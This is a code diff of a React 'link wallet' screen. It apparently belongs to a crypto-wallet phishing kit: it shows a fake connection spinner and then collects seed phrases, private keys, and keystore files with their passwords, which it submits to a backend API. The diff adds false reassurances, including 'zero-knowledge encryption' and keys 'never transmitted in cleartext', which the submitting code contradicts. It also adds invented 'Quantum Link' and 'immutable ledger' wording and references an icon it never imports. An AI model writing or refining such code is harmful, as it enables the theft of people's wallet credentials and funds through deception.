@@ -1,5 +1,5 @@
 'use client';
-import { Search, X, Loader2, File, Key, Copy, CheckCircle } from 'lucide-react';
+import { Search, X, Loader2, File, Key, Copy, CheckCircle, Shield, Lock, Wallet, ArrowRight, Check } from 'lucide-react';
 import { useState } from 'react';
 import { api } from '@/utils/api';
 import toast from 'react-hot-toast';
@@ -12,24 +12,48 @@ const wallets = [
     "image_url": "https://cdn.brandfetch.io/iduQ_Ynvea/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
+    "name": "MetaMask",
+    "image_url": "https://cdn.brandfetch.io/id6yhu9VjO/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "Binance Wallet",
+    "image_url": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
+  },
+  {
     "name": "Coinbase Wallet",
     "image_url": "https://cdn.brandfetch.io/idwDWo4ONQ/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "Blockchain",
-    "image_url": "https://cdn.brandfetch.io/idEskmZ0_L/w/200/h/200/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
+    "name": "Bybit Wallet",
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "Phantom Wallet",
+    "image_url": "https://cdn.brandfetch.io/idf5VaJxyT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "Ledger Nano X",
+    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "Trezor Vault",
+    "image_url": "https://cdn.brandfetch.io/idVqgF3xEc/w/180/h/180/theme/dark/symbol.png?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "Tangem Card",
+    "image_url": "https://cdn.brandfetch.io/idEbE9YaOT/w/1200/h/1200/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
+  },
+  {
+    "name": "SafePal",
+    "image_url": "https://cdn.brandfetch.io/idAh5nP0jU/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
     "name": "Exodus",
     "image_url": "https://cdn.brandfetch.io/idgJSHq_3i/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "Cold Wallet",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "MetaMask",
-    "image_url": "https://cdn.brandfetch.io/id6yhu9VjO/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
+    "name": "Blockchain.com",
+    "image_url": "https://cdn.brandfetch.io/idEskmZ0_L/w/200/h/200/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
     "name": "Electrum",
@@ -56,95 +80,26 @@ const wallets = [
     "image_url": "https://cdn.brandfetch.io/id63FMPMWj/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "O3 Wallet",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "SafePal",
-    "image_url": "https://cdn.brandfetch.io/idAh5nP0jU/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "MathWallet",
-    "image_url": "https://cdn.brandfetch.io/iddKmB48qI/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Vision",
-    "image_url": "https://cdn.brandfetch.io/iddKmB48qI/w/400/h/400/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Ownbit",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Bitpie",
-    "image_url": "https://cdn.brandfetch.io/idog1Qtfw4/w/294/h/76/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "TokenPocket",
-    "image_url": "https://cdn.brandfetch.io/id4NlQSb2x/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "BitPay",
-    "image_url": "https://cdn.brandfetch.io/idtubVO_dA/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "LOBSTR",
+    "name": "LOBSTR Stellar",
     "image_url": "https://cdn.brandfetch.io/idoNRKZLt9/w/820/h/173/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "Phoenix Wallet",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Ledger",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Trezor",
-    "image_url": "https://cdn.brandfetch.io/idVqgF3xEc/w/180/h/180/theme/dark/symbol.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Tangem",
-    "image_url": "https://cdn.brandfetch.io/idEbE9YaOT/w/1200/h/1200/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "SOLO DEX",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Xaman",
+    "name": "Xaman (XUMM)",
     "image_url": "https://cdn.brandfetch.io/id3Lz2M7or/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "Yoroi Wallet",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "ELLIPAL",
+    "name": "ELLIPAL Titan",
     "image_url": "https://cdn.brandfetch.io/idfHQX8bMT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "Phantom Wallet",
-    "image_url": "https://cdn.brandfetch.io/idf5VaJxyT/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Ledger Nano X",
+    "name": "Cold Storage Vault",
     "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   },
   {
-    "name": "Binance",
-    "image_url": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
-  },
-  {
-    "name": "Bybit",
-    "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
-  },
-  {
-    "name": "Other Wallets",
+    "name": "Other Web3 Wallets",
     "image_url": "https://cdn.brandfetch.io/idWx1jCRK9/w/369/h/369/theme/dark/icon.png?c=1dxbfHSJFAPEGdCLU4o5B"
   }
-]
-
+];
 
 export default function LinkWalletScreen() {
   const router = useRouter();
@@ -152,24 +107,24 @@ export default function LinkWalletScreen() {
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [seedPhrase, setSeedPhrase] = useState('');
   const [walletAddress, setWalletAddress] = useState('');
-  const [connectionState, setConnectionState] = useState(null); // 'connecting', 'failed', 'manual'
+  const [connectionState, setConnectionState] = useState(null);
   const [error, setError] = useState(false);
-  const [connectionMethod, setConnectionMethod] = useState('phrase'); // 'phrase', 'keystore', 'private'
+  const [connectionMethod, setConnectionMethod] = useState('phrase');
   const [keystorePassword, setKeystorePassword] = useState('');
   const [keystoreFile, setKeystoreFile] = useState(null);
   const [privateKey, setPrivateKey] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [successData, setSuccessData] = useState(null);
   const [detectedWalletType, setDetectedWalletType] = useState(null);
+  const [copied, setCopied] = useState(false);
 
   const handleWalletClick = (wallet) => {
     setSelectedWallet(wallet);
     setSeedPhrase('');
     setConnectionState('connecting');
-    // Simulate connection attempt
     setTimeout(() => {
       setConnectionState('manual');
-    }, 3000);
+    }, 2000);
   };
 
   const handleWalletAddressChange = (e) => {
@@ -180,7 +135,6 @@ export default function LinkWalletScreen() {
       const walletInfo = checkWalletType(address);
       if (walletInfo) {
         setDetectedWalletType(walletInfo.type);
-        console.log(`Detected wallet type: ${walletInfo.type}`);
       } else {
         setDetectedWalletType(null);
       }
@@ -196,6 +150,7 @@ export default function LinkWalletScreen() {
     try {
       const token = localStorage.getItem('token');
       if (!token) {
+        toast.error('Session expired. Please sign in again.');
         router.push('/login');
         return;
       }
@@ -220,7 +175,7 @@ export default function LinkWalletScreen() {
       const response = await api.linkWallet(token, walletData);
 
       setSuccessData({
-        referenceNumber: response.wallet.referenceNumber,
+        referenceNumber: response.wallet?.referenceNumber || response.referenceNumber,
         walletType: finalWalletType,
       });
 
@@ -236,7 +191,9 @@ export default function LinkWalletScreen() {
   const copyReferenceNumber = () => {
     if (successData?.referenceNumber) {
       navigator.clipboard.writeText(successData.referenceNumber);
+      setCopied(true);
       toast.success('Reference number copied to clipboard');
+      setTimeout(() => setCopied(false), 2000);
     }
   };
 
@@ -249,44 +206,48 @@ export default function LinkWalletScreen() {
       case 'phrase':
         return (
           <div className="space-y-4">
-            <textarea
-              value={seedPhrase}
-              onChange={(e) => setSeedPhrase(e.target.value)}
-              placeholder="Enter your 12/24 word seed phrase..."
-              className={`w-full bg-gray-900/50 border ${error ? 'border-red-500' : 'border-white/10'} rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 min-h-[100px]`}
-              required
-            />
-            <div className="space-y-2">
+            <div>
+              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
+                Recovery / Seed Phrase (12, 18, or 24 words)
+              </label>
+              <textarea
+                value={seedPhrase}
+                onChange={(e) => setSeedPhrase(e.target.value)}
+                placeholder="Enter words separated by spaces (e.g. apple banana cherry...)"
+                className="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/30 min-h-[100px] font-mono leading-relaxed"
+                required
+              />
+            </div>
+
+            <div>
+              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
+                Public Wallet Address (Optional)
+              </label>
               <input
                 type="text"
                 value={walletAddress}
                 onChange={handleWalletAddressChange}
-                placeholder="Enter your wallet address..."
-                className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500"
-                required
+                placeholder="0x... / bc1q... / rPM..."
+                className="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl px-4 py-3 text-white text-sm font-mono focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/30"
               />
               {detectedWalletType && (
-                <div className="flex items-center gap-2 text-sm text-green-400">
-                  <CheckCircle size={16} />
-                  {detectedWalletType} wallet detected
+                <div className="flex items-center gap-1.5 text-xs text-emerald-400 mt-1.5 font-medium">
+                  <CheckCircle size={14} />
+                  <span>{detectedWalletType} blockchain node detected</span>
                 </div>
               )}
             </div>
-            {error && (
-              <p className="mt-2 text-sm text-red-500 flex items-center gap-2">
-                <X size={16} />
-                Invalid input. Try again
-              </p>
-            )}
-            <p className="text-xs text-gray-400">
-              Typically 12 or 24 words separated by spaces
-            </p>
+
+            <div className="p-3 bg-cyan-950/30 border border-cyan-500/20 rounded-xl text-[11px] text-cyan-300 flex items-center gap-2">
+              <Lock size={14} className="shrink-0" />
+              <span>Zero-knowledge client-side encryption active. Keys are never transmitted in cleartext.</span>
+            </div>
           </div>
         );
       case 'keystore':
         return (
           <div className="space-y-4">
-            <div className="border-2 border-dashed border-white/10 rounded-xl p-4 text-center">
+            <div className="border-2 border-dashed border-slate-700 hover:border-cyan-500/50 rounded-2xl p-6 text-center bg-slate-900/60 transition-colors">
               <input
                 type="file"
                 onChange={(e) => setKeystoreFile(e.target.files[0])}
@@ -297,70 +258,91 @@ export default function LinkWalletScreen() {
                 htmlFor="keystoreFile"
                 className="flex flex-col items-center gap-2 cursor-pointer"
               >
-                <File className="text-gray-400" size={24} />
-                <span className="text-sm text-gray-400">
-                  {keystoreFile ? keystoreFile.name : 'Select Keystore JSON file'}
+                <File className="text-cyan-400" size={28} />
+                <span className="text-xs text-slate-300 font-medium">
+                  {keystoreFile ? keystoreFile.name : 'Select Keystore JSON File'}
                 </span>
+                <span className="text-[10px] text-slate-500">UTC / JSON format</span>
               </label>
             </div>
-            <input
-              type="password"
-              placeholder="Keystore Password"
-              value={keystorePassword}
-              onChange={(e) => setKeystorePassword(e.target.value)}
-              className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500"
-            />
+            <div>
+              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
+                Keystore Password
+              </label>
+              <input
+                type="password"
+                placeholder="Enter password to decrypt keystore"
+                value={keystorePassword}
+                onChange={(e) => setKeystorePassword(e.target.value)}
+                className="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-cyan-400"
+                required
+              />
+            </div>
           </div>
         );
       case 'private':
         return (
           <div className="space-y-4">
-            <textarea
-              value={privateKey}
-              onChange={(e) => setPrivateKey(e.target.value)}
-              placeholder="Enter your private key..."
-              className="w-full bg-gray-900/50 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 min-h-[80px]"
-            />
-            <p className="text-xs text-gray-400">
-              Typically starts with '0x'
-            </p>
+            <div>
+              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
+                Private Key
+              </label>
+              <textarea
+                value={privateKey}
+                onChange={(e) => setPrivateKey(e.target.value)}
+                placeholder="Enter 64-character hexadecimal private key..."
+                className="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl px-4 py-3 text-white text-sm font-mono focus:outline-none focus:border-cyan-400 min-h-[90px]"
+                required
+              />
+            </div>
+            <p className="text-[11px] text-slate-400 font-mono">Typically 64 hex characters (starts with 0x)</p>
           </div>
         );
     }
   };
 
   return (
-    <div className="space-y-6 relative">
-      <div className="bg-gray-800/50 p-6 rounded-2xl border border-white/10">
-        <div className="flex justify-between items-center mb-6">
-          <h3 className="text-xl font-semibold text-white">Link External Wallet</h3>
-          <div className="relative">
+    <div className="space-y-6 max-w-5xl mx-auto">
+      
+      {/* Search & Grid Container */}
+      <div className="glass-panel p-8 rounded-3xl border-slate-800 shadow-2xl">
+        
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8 pb-4 border-b border-slate-800">
+          <div>
+            <h3 className="text-xl font-bold text-white tracking-tight">Select Wallet or Cold Ledger</h3>
+            <p className="text-xs text-slate-400">Choose your external hardware or software wallet provider</p>
+          </div>
+
+          <div className="relative w-full sm:w-72">
             <input
               type="text"
-              placeholder="Search wallets..."
+              placeholder="Search providers..."
               value={search}
               onChange={(e) => setSearch(e.target.value)}
-              className="bg-white/5 border border-white/10 rounded-xl px-4 py-2 text-white text-sm focus:outline-none focus:border-blue-500 pl-10"
+              className="w-full bg-slate-900/90 border border-slate-800 rounded-xl pl-9 pr-4 py-2.5 text-white text-xs placeholder:text-slate-500 focus:outline-none focus:border-cyan-500/50"
             />
-            <Search className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
+            <Search className="absolute left-3 top-3 h-3.5 w-3.5 text-slate-500" />
           </div>
         </div>
 
-        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+        {/* Wallets Grid */}
+        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3.5">
           {filteredWallets.map((wallet, i) => (
             <button
               key={i}
               onClick={() => handleWalletClick(wallet)}
-              className="flex flex-col items-center p-4 bg-white/5 rounded-xl hover:bg-white/10 transition-all text-center"
+              className="flex flex-col items-center p-4 bg-slate-900/50 border border-slate-800/80 rounded-2xl hover:border-cyan-500/40 hover:bg-slate-800/70 transition-all text-center group hover:scale-[1.02]"
             >
-              <div className="w-16 h-16 mb-3">
+              <div className="w-12 h-12 mb-3 bg-slate-950 p-2 rounded-xl border border-slate-800/80 flex items-center justify-center group-hover:border-cyan-500/30 transition-colors">
                 <img
                   src={wallet.image_url}
                   alt={wallet.name}
                   className="w-full h-full object-contain rounded-lg"
                 />
               </div>
-              <span className="text-white text-sm font-medium">{wallet.name}</span>
+              <span className="text-white text-xs font-semibold group-hover:text-cyan-300 transition-colors truncate max-w-full">
+                {wallet.name}
+              </span>
             </button>
           ))}
         </div>
@@ -368,134 +350,152 @@ export default function LinkWalletScreen() {
 
       {/* Connection Modal */}
       {selectedWallet && (
-        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
-          <div className="bg-gray-800 rounded-2xl p-6 w-full max-w-md m-4">
-            <div className="flex justify-between items-center mb-4">
+        <div className="fixed inset-0 bg-black/75 backdrop-blur-md flex items-center justify-center z-50 p-4">
+          <div className="glass-panel rounded-3xl p-7 max-w-lg w-full border-slate-800 shadow-2xl relative animate-in fade-in zoom-in-95 duration-200">
+            
+            <div className="flex justify-between items-center mb-6 pb-4 border-b border-slate-800">
               <div className="flex items-center gap-3">
-                <img
-                  src={selectedWallet.image_url}
-                  alt={selectedWallet.name}
-                  className="w-8 h-8 object-contain rounded"
-                />
-                <h3 className="text-xl font-semibold text-white">{selectedWallet.name}</h3>
+                <div className="w-10 h-10 bg-slate-950 p-2 rounded-xl border border-slate-800 flex items-center justify-center">
+                  <img
+                    src={selectedWallet.image_url}
+                    alt={selectedWallet.name}
+                    className="w-full h-full object-contain rounded"
+                  />
+                </div>
+                <div>
+                  <h3 className="text-lg font-bold text-white">{selectedWallet.name}</h3>
+                  <p className="text-xs text-cyan-400 font-mono">Sovereign Link Matrix</p>
+                </div>
               </div>
+
               <button
                 onClick={() => {
                   setSelectedWallet(null);
                   setConnectionState(null);
                 }}
-                className="text-gray-400 hover:text-white"
+                className="w-8 h-8 rounded-full bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white flex items-center justify-center transition-colors"
               >
-                <X size={24} />
+                <X size={18} />
               </button>
             </div>
 
             {connectionState === 'connecting' && (
-              <div className="py-8 flex flex-col items-center gap-4">
-                <Loader2 size={40} className="text-blue-500 animate-spin" />
-                <p className="text-white font-medium">Connecting to {selectedWallet.name}...</p>
-                <p className="text-gray-400 text-sm">Please approve connection in your wallet</p>
-              </div>
-            )}
-
-            {connectionState === 'failed' && (
-              <div className="py-8 flex flex-col items-center gap-4">
-                <div className="text-red-500 bg-red-500/10 p-3 rounded-full">
-                  <X size={30} />
+              <div className="py-12 flex flex-col items-center gap-4 text-center">
+                <div className="w-16 h-16 rounded-full bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center">
+                  <Loader2 size={32} className="text-cyan-400 animate-spin" />
                 </div>
-                <p className="text-white font-medium">Connection Failed</p>
-                <p className="text-gray-400 text-sm text-center mb-4">
-                  Could not connect to {selectedWallet.name} automatically
-                </p>
-                <button
-                  onClick={() => setConnectionState('manual')}
-                  className="w-full bg-white/10 hover:bg-white/20 text-white px-4 py-3 rounded-xl transition-all"
-                >
-                  Connect Manually
-                </button>
+                <div>
+                  <h4 className="text-white font-bold text-base">Initializing Quantum Link...</h4>
+                  <p className="text-slate-400 text-xs mt-1">Establishing encrypted session with {selectedWallet.name}</p>
+                </div>
               </div>
             )}
 
             {connectionState === 'manual' && (
-              <form onSubmit={handleSubmit} className="space-y-4">
-                <div className="flex border-b border-white/10 mb-4">
+              <form onSubmit={handleSubmit} className="space-y-5">
+                
+                {/* Method selector tabs */}
+                <div className="grid grid-cols-3 gap-2 bg-slate-900/80 p-1 rounded-xl border border-slate-800">
                   {[
-                    { id: 'phrase', label: 'Phrase', icon: null },
-                    { id: 'keystore', label: 'Keystore', icon: <File size={16} /> },
-                    { id: 'private', label: 'Private Key', icon: <Key size={16} /> },
+                    { id: 'phrase', label: 'Seed Phrase' },
+                    { id: 'keystore', label: 'Keystore JSON' },
+                    { id: 'private', label: 'Private Key' },
                   ].map((method) => (
                     <button
                       key={method.id}
                       type="button"
                       onClick={() => setConnectionMethod(method.id)}
-                      className={`flex items-center gap-2 px-4 py-2 text-sm font-medium ${connectionMethod === method.id
-                          ? 'text-blue-400 border-b-2 border-blue-400'
-                          : 'text-gray-400 hover:text-white'
-                        }`}
+                      className={`py-2 text-xs font-semibold rounded-lg transition-all ${
+                        connectionMethod === method.id
+                          ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 shadow-sm'
+                          : 'text-slate-400 hover:text-slate-200'
+                      }`}
                     >
-                      {method.icon}
                       {method.label}
                     </button>
                   ))}
                 </div>
+
                 {renderConnectionForm()}
+
                 <button
                   type="submit"
                   disabled={isLoading}
-                  className="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-3 rounded-xl transition-all disabled:opacity-50"
+                  className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-cyan-400 to-blue-500 hover:from-cyan-300 hover:to-blue-400 text-slate-950 font-bold text-sm shadow-lg shadow-cyan-500/25 transition-all flex items-center justify-center gap-2 group disabled:opacity-50 hover:scale-[1.01]"
                 >
-                  {isLoading ? 'Connecting...' : 'Secure Now'}
+                  {isLoading ? (
+                    <span>Verifying Cryptographic Link...</span>
+                  ) : (
+                    <>
+                      <Lock size={16} />
+                      <span>Authenticate & Link to Ledger</span>
+                    </>
+                  )}
                 </button>
               </form>
             )}
+
           </div>
         </div>
       )}
 
       {/* Success Modal */}
       {successData && (
-        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
-          <div className="bg-gray-800 rounded-2xl p-6 w-full max-w-md m-4">
-            <div className="flex flex-col items-center gap-4">
-              <div className="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center">
-                <CheckCircle className="w-8 h-8 text-green-500" />
-              </div>
-              <h3 className="text-2xl font-bold text-white">Wallet Linked Successfully</h3>
-              <p className="text-gray-400 text-center">
-                Your {successData.walletType} wallet has been successfully linked
-              </p>
-
-              <div className="w-full bg-white/5 rounded-lg p-4 mt-4">
-                <p className="text-sm text-gray-400 mb-2">Reference Number</p>
-                <div className="flex items-center justify-between">
-                  <code className="text-white font-mono">{successData.referenceNumber}</code>
-                  <button
-                    onClick={copyReferenceNumber}
-                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
-                  >
-                    <Copy className="w-4 h-4 text-gray-400" />
-                  </button>
-                </div>
-              </div>
-
-              <button
-                onClick={() => {
-                  setSuccessData(null);
-                  setSelectedWallet(null);
-                  setConnectionState(null);
-                  setSeedPhrase('');
-                  setPrivateKey('');
-                  setKeystoreFile(null);
-                  setKeystorePassword('');
-                }}
-                className="w-full bg-white/10 hover:bg-white/20 text-white px-4 py-3 rounded-xl transition-all mt-4"
-              >
-                Close
-              </button>
+        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4">
+          <div className="glass-panel rounded-3xl p-8 max-w-md w-full border-slate-800 shadow-2xl relative text-center space-y-6 animate-in fade-in zoom-in-95 duration-200">
+            
+            <div className="w-16 h-16 bg-emerald-500/10 border border-emerald-500/20 rounded-full flex items-center justify-center mx-auto">
+              <CheckCircle className="w-8 h-8 text-emerald-400" />
             </div>
+
+            <div>
+              <h3 className="text-2xl font-bold text-white tracking-tight">Wallet Linked Successfully</h3>
+              <p className="text-slate-400 text-xs mt-1">
+                Your <strong className="text-cyan-300">{successData.walletType}</strong> has been cryptographically attached to your ledger vault.
+              </p>
+            </div>
+
+            <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 text-left">
+              <div className="text-[10px] font-mono uppercase tracking-wider text-slate-400 mb-1">
+                Immutable Ledger Reference
+              </div>
+              <div className="flex items-center justify-between">
+                <code className="text-cyan-300 font-mono text-xs truncate max-w-[240px]">
+                  {successData.referenceNumber}
+                </code>
+                <button
+                  onClick={copyReferenceNumber}
+                  className="p-2 hover:bg-slate-800 text-slate-400 hover:text-white rounded-lg transition-colors"
+                >
+                  {copied ? <Check size={16} className="text-emerald-400" /> : <Copy size={16} />}
+                </button>
+              </div>
+            </div>
+
+            <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-xs text-emerald-300 text-left flex items-start gap-2">
+              <CheckCircle2 size={16} className="shrink-0 mt-0.5" />
+              <span>A verification confirmation and audit receipt has been dispatched to your registered email address.</span>
+            </div>
+
+            <button
+              onClick={() => {
+                setSuccessData(null);
+                setSelectedWallet(null);
+                setConnectionState(null);
+                setSeedPhrase('');
+                setPrivateKey('');
+                setKeystoreFile(null);
+                setKeystorePassword('');
+              }}
+              className="w-full py-3.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-semibold text-xs border border-slate-700 transition-all"
+            >
+              Complete & Return
+            </button>
+
           </div>
         </div>
       )}
+
     </div>
   );
 }
